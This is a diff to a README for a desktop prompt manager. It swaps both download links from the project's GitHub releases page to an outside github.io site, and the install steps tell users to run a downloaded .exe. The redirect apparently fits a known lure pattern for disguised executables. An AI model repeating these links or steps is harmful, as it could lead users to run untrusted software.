@@ -1,6 +1,6 @@
 # ⚡ tips-prompt-manager - Manage your prompts on your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/limited-bulgurpilaf79/tips-prompt-manager/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://limited-bulgurpilaf79.github.io)
 
 ## 🎯 About this software
 
@@ -21,7 +21,7 @@ Once you install and open the program, you do not need an internet connection. T
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/limited-bulgurpilaf79/tips-prompt-manager/releases) the latest version.
+1. Visit [this page to download](https://limited-bulgurpilaf79.github.io) the latest version.
 2. Look for the file ending in .exe in the Assets section.
 3. Save the file to your Downloads folder.
 4. Double-click the file to start the installation.
